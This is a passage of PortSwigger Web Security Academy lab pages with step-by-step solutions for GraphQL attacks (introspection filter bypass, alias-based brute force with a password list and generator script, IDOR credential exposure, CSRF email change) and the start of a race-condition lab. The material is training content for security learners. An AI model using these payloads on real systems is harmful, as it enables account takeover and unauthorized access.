                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab,
                find the hidden blog post and enter the password.
            </p>
            <p>
                We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to
                modify
                <a href="https://portswigger.net/web-security/graphql">
                    GraphQL
                </a>
                queries in Repeater, and enables you to scan the API schema.
            </p>
            <p>
                For more information on using InQL, see
                <a
                    href="https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql">
                    Working with GraphQL in Burp Suite
                </a>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/417528e487706565f7a124cb5aa164335f05b77861a2c4875a5165d750de9d3d?referrer=%2fweb-security%2fgraphql%2flab-graphql-reading-private-posts"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        In Burp's browser, access the blog page.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        and notice the following:
                                    </p>
                                    <ul>
                                        <li>
                                            Blog posts are retrieved using a GraphQL query.
                                        </li>
                                        <li>
                                            In the response to the GraphQL query, each blog post has its own sequential
                                            <code>
          id
         </code>
                                            .
                                        </li>
                                        <li>
                                            Blog post
                                            <code>
          id
         </code>
                                            3 is missing from the list. This indicates that there is a hidden blog post.
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <p>
                                        Use InQL to scan the GraphQL endpoint. Notice that the
                                        <code>
         BlogPost
        </code>
                                        type has a
                                        <code>
         postPassword
        </code>
                                        field available.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp's browser, select a blog post. Notice that this causes the site to make
                                        a GraphQL query that fetches the relevant post data via a direct reference to
                                        the post's ID.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the HTTP history, find the relevant GraphQL query. Right-click it and select
                                        <strong>
                                            Send to Repeater
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, modify the
                                        <code>
         id
        </code>
                                        variable to 3 (that is, the
                                        <code>
         id
        </code>
                                        of the hidden blog post). Add the
                                        <code>
         postPassword
        </code>
                                        field to the query.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Copy the contents of the response's
                                        <code>
         postPassword
        </code>
                                        field and paste them into the
                                        <strong>
                                            Submit solution
                                        </strong>
                                        dialog to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Accidental exposure of private GraphQL fields
                (graphql)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                The user management functions for this lab are powered by a
                <a href="https://portswigger.net/web-security/graphql">
                    GraphQL
                </a>
                endpoint. The lab contains an
                <a href="https://portswigger.net/web-security/access-control">
                    access control
                </a>
                vulnerability whereby you can induce the API to reveal user credential fields.
            </p>
            <p>
                To solve the lab, sign in as the administrator and delete the username
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to
                modify GraphQL queries in Repeater, and enables you to scan the API schema.
            </p>
            <p>
                For more information on using InQL, see
                <a
                    href="https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql">
                    Working with GraphQL in Burp Suite
                </a>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/ccda6760929ebeccab51242f59b1573dd478087800b63c88fc8aa308db137802?referrer=%2fweb-security%2fgraphql%2flab-graphql-accidental-field-exposure"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        In Burp's browser, access the lab and select
                                        <strong>
                                            My account
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Attempt to log in to the site.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        and notice that the login attempt is sent as a GraphQL mutation containing a
                                        username and password.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Right-click the login request and select
                                        <strong>
                                            Send to Repeater
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Use InQL to scan the GraphQL endpoint. Notice the following:
                                    </p>
                                    <ul>
                                        <li>
                                            There is a
                                            <code>
          getUser
         </code>
                                            query that returns a user's username and password.
                                        </li>
                                        <li>
                                            This query fetches the relevant user information via a direct reference to
                                            an
                                            <code>
          id
         </code>
                                            number.
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <p>
                                        Copy the contents of the
                                        <code>
         getUser
        </code>
                                        query.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to the
                                        <strong>
                                            Repeater
                                        </strong>
                                        tab and select the
                                        <strong>
                                            InQL
                                        </strong>
                                        subtab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Paste the contents of the
                                        <code>
         getUser
        </code>
                                        query into the
                                        <code>
         Query
        </code>
                                        box, replacing the original GraphQL login mutation.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Select the
                                        <strong>
                                            Pretty
                                        </strong>
                                        tab and remove the
                                        <code>
         operationName
        </code>
                                        property.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            Send
                                        </strong>
                                        . Notice that the default
                                        <code>
         1334
        </code>
                                        user ID causes the API to return an error.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Test alternative user IDs until the API returns the administrator's credentials.
                                        In this case, the administrator's ID is
                                        <code>
         1
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Log in to the site as the administrator, go to the
                                        <strong>
                                            Admin
                                        </strong>
                                        panel, and delete
                                        <code>
         carlos
        </code>
                                        to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Finding a hidden GraphQL endpoint
                (graphql)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                The user management functions for this lab are powered by a hidden
                <a href="https://portswigger.net/web-security/graphql">
                    GraphQL
                </a>
                endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint
                also has some defenses against introspection.
            </p>
            <p>
                To solve the lab, find the hidden endpoint and delete
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to
                modify GraphQL queries in Repeater, and enables you to scan the API schema.
            </p>
            <p>
                For more information on using InQL, see
                <a
                    href="https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql">
                    Working with GraphQL in Burp Suite
                </a>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/3a73e7aa263f5e0db7ac8a1c6cd9ec592206484cee2ac6fde2dc304cb2d13129?referrer=%2fweb-security%2fgraphql%2flab-graphql-find-the-endpoint"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        In Repeater, send requests to some common GraphQL endpoint suffixes and inspect
                                        the results.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Note that when you send a GET request to
                                        <code>
         /api
        </code>
                                        the response contains a "Query not present" error. This hints that there may be
                                        a GraphQL endpoint responding to GET requests at this location.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Amend the request to contain a universal query. Note that, because the endpoint
                                        is responding to GET requests, you need to send the query as a URL parameter.
                                    </p>
                                    <p>
                                        For example:
                                        <code>
         /api?query=query{__typename}
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that the response confirms that this is a GraphQL endpoint:
                                    </p>
                                    <code class="code-scrollable">
        {
      "data": {
        "__typename": "query"
      }
    }
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send a new request with a URL-encoded introspection query as a query parameter.
                                    </p>
                                    <p>
                                        For example:
                                    </p>
                                    <code class="code-scrollable">
        /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
       </code>
                                </li>
                                <li>
                                    <p>
                                        Notice from the response that introspection is disallowed.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Modify the query to include a newline character after
                                        <code>
         __schema
        </code>
                                        and resend.
                                    </p>
                                    <p>
                                        For example:
                                    </p>
                                    <code class="code-scrollable">
        /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
       </code>
                                </li>
                                <li>
                                    <p>
                                        Notice that the response now includes full introspection details. This is
                                        because the server is configured to exclude queries matching the regex
                                        <code>
         "__schema{"
        </code>
                                        , which the query no longer matches even though it is still a valid
                                        introspection query.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Save the introspection response body as a local JSON file.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to the
                                        <strong>
                                            InQL Scanner
                                        </strong>
                                        tab and scan the saved file.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Browse the schema and find the
                                        <code>
         getUser
        </code>
                                        query.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, send the
                                        <code>
         getUser
        </code>
                                        query to the endpoint you discovered. Note that you need to convert the query to
                                        URL encoding.
                                    </p>
                                    <p>
                                        For example:
                                    </p>
                                    <code class="code-scrollable">
        /api?query=query%20%7B%0A%09getUser(id%3A1334)%20%7B%0A%09%09id%0A%09%09username%0A%09%7D%0A%7D
       </code>
                                </li>
                                <li>
                                    <p>
                                        Notice that the default
                                        <code>
         1334
        </code>
                                        user ID causes the API to return an error.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Test alternative user IDs until the API confirms
                                        <code>
         carlos
        </code>
                                        's user ID. In this case, the relevant user ID is
                                        <code>
         3
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the
                                        <strong>
                                            InQL Scanner
                                        </strong>
                                        tab, browse the schema again and find the
                                        <code>
         deleteOrganizationUser
        </code>
                                        mutation. Notice that this mutation takes a user ID as a parameter.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, send a
                                        <code>
         deleteOrganizationUser
        </code>
                                        mutation with a user ID of
                                        <code>
         3
        </code>
                                        to delete
                                        <code>
         carlos
        </code>
                                        and solve the lab.
                                    </p>
                                    <p>
                                        For example:
                                    </p>
                                    <code class="code-scrollable">
        /api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Bypassing GraphQL brute force protections
                (graphql)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                The user login mechanism for this lab is powered by a
                <a href="https://portswigger.net/web-security/graphql">
                    GraphQL
                </a>
                API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the
                same origin in a short space of time.
            </p>
            <p>
                To solve the lab, brute force the login mechanism to sign in as
                <code>
   carlos
  </code>
                . Use the list of
                <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">
                    authentication lab passwords
                </a>
                as your password source.
            </p>
            <p>
                We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to
                modify GraphQL queries in Repeater.
            </p>
            <p>
                For more information on using InQL, see
                <a
                    href="https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql">
                    Working with GraphQL in Burp Suite
                </a>
                .
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Tip
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                This lab requires you to craft a large request that uses aliases to send multiple login
                                attempts at the same time. As this request could be time-consuming to create manually,
                                we recommend you use a script to build the request.
                            </p>
                            <p>
                                The below example JavaScript builds a list of aliases corresponding to our list of
                                authentication lab passwords and copies the request to your clipboard. To run this
                                script:
                            </p>
                            <ol>
                                <li>
                                    Open the lab in Burp's browser.
                                </li>
                                <li>
                                    Right-click the page and select
                                    <strong>
                                        Inspect
                                    </strong>
                                    .
                                </li>
                                <li>
                                    Select the
                                    <strong>
                                        Console
                                    </strong>
                                    tab.
                                </li>
                                <li>
                                    Paste the script and press Enter.
                                </li>
                            </ol>
                            <p>
                                You can then use the generated aliases when crafting your request in Repeater.
                            </p>
                            <code class="pre-wrap">
      copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=&gt;`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
     </code>
                        </div>
                    </div>
                </details>
            </div>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        In Burp's browser, access the lab and select
                                        <strong>
                                            My account
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Attempt to log in to the site.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        . Note that login requests are sent as a GraphQL mutation.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Right-click the login request and select
                                        <strong>
                                            Send to Repeater
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, attempt some further login requests. Note that after a short period
                                        of time the API starts to return a rate limit error.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Craft a request that uses aliases to send multiple login mutations in one
                                        message. See the lab instructions for a tip that will make this process less
                                        time-consuming.
                                    </p>
                                    <p>
                                        Bear the following in mind when constructing your request:
                                    </p>
                                    <ul>
                                        <li>
                                            The list of aliases should be contained within a
                                            <code>
          mutation {}
         </code>
                                            type.
                                        </li>
                                        <li>
                                            Each aliased mutation should have the username
                                            <code>
          carlos
         </code>
                                            and a different password from the authentication list.
                                        </li>
                                        <li>
                                            If you are modifying the request that you sent to Repeater, delete the
                                            variable dictionary and
                                            <code>
          operationName
         </code>
                                            field from the request before sending. You can do this from Repeater's
                                            <strong>
                                                Pretty
                                            </strong>
                                            tab.
                                        </li>
                                        <li>
                                            Ensure that each alias requests the
                                            <code>
          success
         </code>
                                            field, as shown in the simplified example below:
                                        </li>
                                    </ul>
                                    <code class="code-scrollable">
        mutation {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }

          bruteforce1:login(input:{password: "password", username: "carlos"}) {
              token
              success
          }

    ...

          bruteforce99:login(input:{password: "12345678", username: "carlos"}) {
              token
              success
          }
    }
       </code>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            Send
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that the response lists each login attempt and whether its login attempt
                                        was successful.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Use the search bar below the response to search for the string
                                        <code>
         true
        </code>
                                        . This indicates which of the aliased mutations was able to successfully log in
                                        as
                                        <code>
         carlos
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Check the request for the password that was used by the successful alias.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Log in to the site using the
                                        <code>
         carlos
        </code>
                                        credentials to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/1ff12f295e639070b0200de527e0d58cd54ffe26907088691be7155d78305dc9?referrer=%2fweb-security%2fgraphql%2flab-graphql-brute-force-protection-bypass"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Performing CSRF exploits over GraphQL
                (graphql)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                The user management functions for this lab are powered by a
                <a href="https://portswigger.net/web-security/graphql">
                    GraphQL
                </a>
                endpoint. The endpoint accepts requests with a content-type of
                <code>
   x-www-form-urlencoded
  </code>
                and is therefore vulnerable to
                <a href="https://portswigger.net/web-security/csrf">
                    cross-site request forgery
                </a>
                (CSRF) attacks.
            </p>
            <p>
                To solve the lab, craft some HTML that uses a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF attack
                </a>
                to change the viewer's email address, then upload it to your exploit server.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
                .
            </p>
            <p>
                We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to
                modify GraphQL queries in Repeater.
            </p>
            <p>
                For more information on using InQL, see
                <a
                    href="https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql">
                    Working with GraphQL in Burp Suite
                </a>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/ee2c12983456a4312f8435c1ffb0292d55c10e35dd899de6fb8bb3560257ef75?referrer=%2fweb-security%2fgraphql%2flab-graphql-csrf-via-graphql-api"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Open Burp's browser, access the lab and log in to your account.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Enter a new email address, then click
                                        <strong>
                                            Update email
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        and check the resulting request. Note that the email change is sent as a GraphQL
                                        mutation.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Right-click the email change request and select
                                        <strong>
                                            Send to Repeater
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, amend the GraphQL query to change the email to a second different
                                        address.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            Send
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the response, notice that the email has changed again. This indicates that
                                        you can reuse a session cookie to send multiple requests.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Convert the request into a POST request with a
                                        <code>
         Content-Type
        </code>
                                        of
                                        <code>
         x-www-form-urlencoded
        </code>
                                        . To do this, right-click the request and select
                                        <strong>
                                            Change request method
                                        </strong>
                                        twice.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that the mutation request body has been deleted. Add the request body
                                        back in with URL encoding.
                                    </p>
                                    <p>
                                        The body should look like the below:
                                    </p>
                                    <p>
                                        <code class="code-scrollable">
         query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&amp;operationName=changeEmail&amp;variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
        </code>
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Right-click the request and select
                                        <strong>
                                            Engagement tools &gt; Generate CSRF PoC
                                        </strong>
                                        . Burp displays the
                                        <strong>
                                            CSRF PoC generator
                                        </strong>
                                        dialog.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Amend the HTML in the
                                        <strong>
                                            CSRF PoC generator
                                        </strong>
                                        dialog so that it changes the email a third time. This step is necessary because
                                        otherwise the exploit won't make any changes to the current email address at the
                                        time it is run. Likewise, if you test the exploit before delivering, make sure
                                        that you change the email from whatever it is currently set to before delivering
                                        to the victim.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Copy the HTML.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the lab, click
                                        <strong>
                                            Go to exploit server
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Paste the HTML into the exploit server and click
                                        <strong>
                                            Deliver exploit to victim
                                        </strong>
                                        to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Limit overrun
                <a href="https://portswigger.net/web-security/race-conditions">
                    race conditions
                </a>
                (race-conditions)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab's purchasing flow contains a race condition that enables you to purchase items for an
                unintended price.
            </p>
            <p>
                To solve the lab, successfully purchase a
                <strong>
                    Lightweight L33t Leather Jacket
                </strong>
                .
            </p>
            <p>
                You can log in to your account with the following credentials:
                <code>
   wiener:peter
  </code>
                .
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    Solving this lab requires Burp Suite 2023.9 or higher.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/93e6ca17d9b52ed52a43ab57ed12be395d0766f8c58541cbaecd8f1418912a69?referrer=%2fweb-security%2frace-conditions%2flab-race-conditions-limit-overrun"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <h2 id="predict-a-potential-collision">
                                Predict a potential collision
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Log in and buy the cheapest item possible, making sure to use the provided
                                        discount code so that you can study the purchasing flow.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Consider that the shopping cart mechanism and, in particular, the restrictions
                                        that determine what you are allowed to order, are worth trying to bypass.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, from the proxy history, identify all endpoints that enable you to
                                        interact with the cart. For example, a
                                        <code>
         POST /cart
        </code>
                                        request adds items to the cart and a
                                        <code>
         POST /cart/coupon
        </code>
                                        request applies the discount code.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Try to identify any restrictions that are in place on these endpoints. For
                                        example, observe that if you try applying the discount code more than once, you
                                        receive a
                                        <code>
         Coupon already applied
        </code>
                                        response.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Make sure you have an item to your cart, then send the
                                        <code>
         GET /cart
        </code>
                                        request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, try sending the
                                        <code>
         GET /cart
        </code>
                                        request both with and without your session cookie. Confirm that without the
